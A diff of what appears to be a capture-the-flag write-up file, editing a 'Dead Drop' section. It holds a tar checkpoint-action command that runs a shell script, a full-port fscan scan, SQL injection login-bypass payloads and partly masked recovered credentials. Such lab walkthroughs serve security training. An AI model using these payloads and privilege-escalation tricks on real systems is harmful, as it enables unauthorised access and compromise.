@@ -145,14 +145,15 @@ tar czf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=sh shel
 ```
 
 # Dead Drop
+
+#### Web Server Exploitation
 ```bash
-[Web Server Exploitation]
 export IP=Target_IP
 #### Scanning
 fscan -h $IP -p 1-65535 ALL  ==> 22,80 Open here
 
-#### Web Server
-[SQL Injection Bypass]
+#### Web login Portal
+==> [SQL Injection Bypass]
 admin'--
 admin' AND 1=1--
 ==> [SQL Injection Database Extraction]
@@ -182,8 +183,8 @@ svc-drop:xxxxxxxxxxxx
 
 {Global search} :- Control + shift + F ==> Type (username,password)
 Found Creds j.harris:xxxxxxxxxxxxx2026!
-
-
 ```
+#### DC
+> Adding soon!, i am going to sleep tonigh
 
 > I am keep updating all Challenge Writeups...
